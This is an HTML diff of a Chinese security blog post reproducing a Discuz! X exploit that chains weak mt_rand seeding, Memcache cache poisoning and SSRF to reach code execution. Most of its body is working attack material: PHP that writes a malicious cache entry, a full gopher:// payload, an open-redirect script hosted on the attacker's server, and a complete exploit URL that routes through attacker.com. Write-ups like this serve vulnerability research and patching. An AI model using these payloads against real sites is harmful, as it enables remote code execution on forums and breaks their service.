@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Discuz! X authkey+Memcache+ssrf getshell一、漏洞简介需要得到authkey 二、漏洞影响三、复现过程Dz 整合 Memcache配置成功后，默认情况下网站首页右下角会出现MemCache On的标志：  Dz 在安装的时候，对于缓存中的键名加了随机字符串作为前缀。所以如果 SSRF要攻击 Memcache ，第一个问题是，如何找到正确的键名？ install">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X%20authkey+Memcache+ssrf%20getshell/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Discuz! X authkey+Memcache+ssrf getshell一、漏洞简介需要得到authkey 二、漏洞影响三、复现过程Dz 整合 Memcache配置成功后，默认情况下网站首页右下角会出现MemCache On的标志：  Dz 在安装的时候，对于缓存中的键名加了随机字符串作为前缀。所以如果 SSRF要攻击 Memcache ，第一个问题是，如何找到正确的键名？ install">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!Xauthkey+Memcache+ssrfgetshell/media/rId24.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!Xauthkey+Memcache+ssrfgetshell/media/rId26.png">
+<meta property="article:published_time" content="2022-07-08T06:25:54.577Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Discuz!Xauthkey+Memcache+ssrfgetshell/media/rId24.jpg">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Discuz/Discuz! X authkey+Memcache+ssrf getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20authkey+Memcache+ssrf%20getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.577Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Discuz-X-authkey-Memcache-ssrf-getshell"><a href="#Discuz-X-authkey-Memcache-ssrf-getshell" class="headerlink" title="Discuz! X authkey+Memcache+ssrf getshell"></a>Discuz! X authkey+Memcache+ssrf getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>需要得到authkey</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>Dz 整合 Memcache<br>配置成功后，默认情况下网站首页右下角会出现<code>MemCache On</code>的标志：</p>
+<p><img src="/resource/Discuz!Xauthkey+Memcache+ssrfgetshell/media/rId24.jpg"></p>
+<p>Dz 在安装的时候，对于缓存中的键名加了随机字符串作为前缀。所以如果 SSRF<br>要攻击 Memcache ，第一个问题是，如何找到正确的键名？</p>
+<p><code>install/index.php</code> 345-357行：</p>
+<pre><code>        $uid = DZUCFULL ? 1 : $adminuser[&#39;uid&#39;];
+        $authkey = md5($_SERVER[&#39;SERVER_ADDR&#39;].$_SERVER[&#39;HTTP_USER_AGENT&#39;].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 8)).random(18);
+        $_config[&#39;db&#39;][1][&#39;dbhost&#39;] = $dbhost;
+        $_config[&#39;db&#39;][1][&#39;dbname&#39;] = $dbname;
+        $_config[&#39;db&#39;][1][&#39;dbpw&#39;] = $dbpw;
+        $_config[&#39;db&#39;][1][&#39;dbuser&#39;] = $dbuser;
+        $_config[&#39;db&#39;][1][&#39;tablepre&#39;] = $tablepre;
+        $_config[&#39;admincp&#39;][&#39;founder&#39;] = (string)$uid;
+        $_config[&#39;security&#39;][&#39;authkey&#39;] = $authkey;
+        $_config[&#39;cookie&#39;][&#39;cookiepre&#39;] = random(4).&#39;_&#39;;
+        $_config[&#39;memory&#39;][&#39;prefix&#39;] = random(6).&#39;_&#39;;
+
+        save_config_file(ROOT_PATH.CONFIG, $_config, $default_config);
+</code></pre>
+<p>这是 Dz 在安装的时候的一段代码，这段代码设置了 authkey、Cookie<br>前缀以及缓存键名前缀，其中用到了<code>random</code>函数生成随机字符串。所以跟进这个<code>random</code>：</p>
+<pre><code>function random($length) &#123;
+    $hash = &#39;&#39;;
+    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;
+    $max = strlen($chars) - 1;
+    PHP_VERSION &lt; &#39;4.2.0&#39; &amp;&amp; mt_srand((double)microtime() * 1000000);
+    for($i = 0; $i &lt; $length; $i++) &#123;
+        $hash .= $chars[mt_rand(0, $max)];
+    &#125;
+    return $hash;
+&#125;
+</code></pre>
+<p>可以发现，如果 PHP 版本大于 4.2.0，那么 <code>mt_rand</code><br>随机数的种子是不变的。也就是说，生成 authkey、Cookie<br>前缀以及缓存键名前缀时调用的 <code>mt_rand</code> 用的都是同一个种子，而 Cookie<br>前缀是已知的，通过观察 HTTP<br>请求就可以知道。因此，随机数播种的种子可以被缩到一个极小的范围内进行猜解。这里可以用<br><a href="https://link.zhihu.com/?target=http://www.openwall.com/php_mt_seed/README">php_mt_seed</a><br>进行种子爆破。</p>
+<p>通过 <code>mt_rand</code> 种子的猜解，缓存键名前缀的可能性从 62^6 缩小到不到 1000<br>个，这就完全属于可以爆破的范畴了。对猜解出来的所有可能的缓存键名前缀分别构造<br>SSRF 请求发送到服务器，最后即能更改某一键名对应的键值。</p>
+<p>Memcache<br>缓存键名的问题解决了，接下来的问题是，缓存数据被加载到哪了？如何通过修改缓存数据来<br>getshell？</p>
+<p>这一部分的思路就可以直接参照 chengable 写的那篇文章了，<code>output_replace</code><br>函数细节有略微变化，但大体思路是一致的，所以我也不再赘述了。</p>
+<p>最后准备用 gopher 协议构造 SSRF 的<br>payload。写这样一段代码（先假设缓存键名前缀是 <code>IwRW7l</code>）:</p>
+<pre><code>&lt;?php
+
+$_G[&#39;setting&#39;][&#39;output&#39;][&#39;preg&#39;][&#39;search&#39;][&#39;plugins&#39;] = &#39;/.*/&#39;;
+$_G[&#39;setting&#39;][&#39;output&#39;][&#39;preg&#39;][&#39;replace&#39;][&#39;plugins&#39;] = &#39;phpinfo()&#39;;
+$_G[&#39;setting&#39;][&#39;rewritestatus&#39;] = 1;
+
+$memcache = new Memcache;
+$memcache-&gt;connect(&#39;localhost&#39;, 11211) or die (&quot;Could not connect&quot;);
+$memcache-&gt;set(&#39;IwRW7l_setting&#39;, $_G[&#39;setting&#39;]);
+</code></pre>
+<p>运行这段 PHP 代码，同时抓包，然后将数据包改成 gopher 的形式，即：</p>
+<pre><code>gopher://localhost:11211/_set%20IwRW7l_setting%201%200%20161%0d%0aa%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D
+</code></pre>
+<p>但是直接用它去 SSRF<br>是不可以的，会被<code>_xss_check</code>检测到特殊字符而被拒绝请求：</p>
+<p>image</p>
+<p>所以利用这里请求跟随跳转的特点，在自己的远程服务器上放类似于这样的一个脚本：</p>
+<pre><code>&lt;?php
+
+$url = base64_decode($_REQUEST[&#39;url&#39;]);
+header( &quot;Location: &quot; . $url );
+</code></pre>
+<p>这样就可以将 SSRF URL 进行 base64 编码从而规避<code>_xss_check</code>的检测。</p>
+<pre><code>http://target/plugin.php?id=wechat:wechat&amp;ac=wxregister&amp;username=vov&amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjExMjExL19zZXQlMjBJd1JXN2xfc2V0dGluZyUyMDElMjAwJTIwMTYxJTBkJTBhYSUzQTIlM0ElN0JzJTNBNiUzQSUyMm91dHB1dCUyMiUzQmElM0ExJTNBJTdCcyUzQTQlM0ElMjJwcmVnJTIyJTNCYSUzQTIlM0ElN0JzJTNBNiUzQSUyMnNlYXJjaCUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTQlM0ElMjIlMkYuKiUyRiUyMiUzQiU3RHMlM0E3JTNBJTIycmVwbGFjZSUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTklM0ElMjJwaHBpbmZvKCklMjIlM0IlN0QlN0QlN0RzJTNBMTMlM0ElMjJyZXdyaXRlc3RhdHVzJTIyJTNCaSUzQTElM0IlN0Q%253D&amp;wxopenid=xxxyyy
+</code></pre>
+<p>再访问<code>/forum.php?mod=ajax&amp;action=getthreadtypes&amp;inajax=yes</code>，即可看到<code>phpinfo()</code>代码已被执行：</p>
+<p><img src="/resource/Discuz!Xauthkey+Memcache+ssrfgetshell/media/rId26.png"></p>
+<p>由于缓存被暴力篡改，会导致网站无法正常运行。恢复正常办法是刷新缓存。用上面的思路直接一次<br>getshell 后执行以下命令，网站就可以恢复正常：</p>
+<pre><code>echo -e &#39;flush_all&#39; | nc localhost 11211
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/51907363">https://zhuanlan.zhihu.com/p/51907363</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X%20authkey+Memcache+ssrf%20getshell/" data-id="cl5c2qnsk004ry8v1hroy2xky" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20Windows%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AF%BC%E8%87%B4%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20authkey%20%E9%87%8D%E7%BD%AE%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E9%82%AE%E7%AE%B1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
